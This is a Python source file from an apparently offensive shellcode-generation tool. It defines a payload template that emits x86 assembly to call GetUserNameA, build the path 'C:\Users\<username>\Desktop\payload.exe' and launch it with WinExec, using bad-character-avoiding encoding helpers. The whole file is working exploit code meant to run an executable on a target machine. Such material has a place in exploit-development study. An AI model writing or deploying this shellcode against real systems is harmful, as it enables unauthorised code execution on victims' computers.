"""Get-username payload template.

Calls GetUserNameA, builds "C:\\Users\\<name>\\Desktop\\payload.exe"
on the stack at runtime, then WinExec's it.  Demonstrates the rep movsb
pattern for runtime string concatenation in shellcode.

Required functions: LoadLibraryA, GetUserNameA, WinExec
Required variables: username_len, path_buf_ptr
Required strings:   advapi_dll, path_prefix, path_suffix
"""
from __future__ import annotations

from ..encode import safe_call_mem, safe_lea, safe_mem_load, safe_mem_store
from .base import PayloadTemplate, TemplateConfig


class GetUsernameTemplate(PayloadTemplate):

    def emit(self, layout, config: TemplateConfig) -> str:
        bc = config.badchars

        get_user_off = -layout.slot("GetUserNameA").offset
        winexec_off  = -layout.slot("WinExec").offset

        ulen_off     = -layout.slot("username_len").offset
        pbuf_off     = -layout.slot("path_buf_ptr").offset

        prefix_off   = -layout.slot("path_prefix").offset
        suffix_off   = -layout.slot("path_suffix").offset

        prefix_str = "C:\\Users\\"
        suffix_str = "\\Desktop\\payload.exe"
        prefix_len = len(prefix_str)
        suffix_len = len(suffix_str) + 1

        return "\n".join([
            "; -- Get Username and Build Path --",
            "; Pattern: rep movsb prefix, GetUserNameA in place, rep movsb suffix",
            "; Result:  C:\\Users\\<username>\\Desktop\\payload.exe",
            "",
            "    ; Step 0: carve 128-byte buffer below ESP for the path",
            "    sub  esp, 128",
            "    mov  edi, esp",
            *safe_mem_store("ebp", pbuf_off, "edi", bc),
            "",
            f"    ; Step 1: copy prefix ({prefix_len} bytes) into path buffer",
            *safe_lea("esi", "ebp", prefix_off, bc),
            *safe_mem_load("edi", "ebp", pbuf_off, bc),
            f"    mov  ecx, {prefix_len}",
            "    rep  movsb",
            "    ; edi now points past the prefix in path_buf",
            "",
            "    ; Step 2: GetUserNameA writes username directly after prefix",
            f"    mov  dword [ebp{ulen_off:+d}], 64",
            "    ; buffer size",
            *safe_lea("eax", "ebp", ulen_off, bc),
            "    push eax                    ; pcbBuffer",
            "    push edi                    ; lpBuffer (right after prefix)",
            *safe_call_mem("ebp", get_user_off, bc),
            "",
            "    ; Step 3: advance past username (username_len includes null)",
            f"    mov  ecx, [ebp{ulen_off:+d}]",
            "    dec  ecx                    ; length without null terminator",
            *safe_mem_load("edi", "ebp", pbuf_off, bc),
            f"    add  edi, {prefix_len}",
            "    ; skip prefix",
            "    add  edi, ecx               ; skip username",
            "",
            f"    ; Step 4: append suffix ({suffix_len} bytes including null)",
            *safe_lea("esi", "ebp", suffix_off, bc),
            f"    mov  ecx, {suffix_len}",
            "    rep  movsb",
            "    ; path_buf now holds the complete null-terminated path",
            "",
            "    ; Step 5: WinExec(path_buf, SW_SHOWNORMAL)",
            *safe_mem_load("eax", "ebp", pbuf_off, bc),
            "    push 1                      ; SW_SHOWNORMAL",
            "    push eax                    ; lpCmdLine",
            *safe_call_mem("ebp", winexec_off, bc),
            "",
        ])

    def cheatsheet(self, config: TemplateConfig) -> list[tuple[str, str]]:
        return [
            ("Path built on target", "C:\\Users\\<username>\\Desktop\\payload.exe"),
            ("Modify path_prefix/path_suffix strings in manifest to change target path", ""),
        ]
